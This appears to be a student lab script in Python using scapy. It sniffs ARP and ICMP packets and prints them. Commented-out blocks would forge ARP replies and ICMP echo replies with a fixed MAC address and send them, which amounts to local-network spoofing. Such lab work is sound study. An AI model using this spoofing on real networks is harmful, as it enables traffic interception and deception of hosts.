from scapy.all import *
def spoof(pkt):
    if pkt.haslayer(ARP):
        pkt.show()
        '''
        fake_ether=Ether(dst=pkt.src,src='08:00:27:4c:81:80',type=0x0806)
        fake_arp=ARP(op=2,hwdst=pkt[ARP].hwsrc,pdst=pkt[ARP].psrc,psrc=pkt[ARP].pdst,)
        pad=Padding('\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
        p=Ether(fake_ether/fake_arp/pad)
        sendp(p)
        print ('send fake arp')
        '''
        
    if pkt.haslayer(ICMP):
        if pkt.getlayer(ICMP).type==8: #echo-request
            pkt.show()
            '''
            fake_ether=Ether(dst=pkt.src,src='08:00:27:4c:81:80',type=0x0800)
            fake_ip=IP(src=pkt[IP].dst,dst=pkt[IP].src,ihl=pkt[IP].ihl,tos=pkt[IP].tos,len=84,proto = 1,flags=0x002)
            fake_icmp=ICMP(type=0,id=pkt[ICMP].id,seq=pkt[ICMP].seq)
            fake_raw=Raw(pkt[Raw].load)
            p=str(fake_ether/fake_ip/fake_icmp/fake_raw)
            p=Ether(p)
            sendp(p)
            print ('send fake icmp')
            '''
     

pkt = sniff(filter='ICMP or ARP',prn=spoof)
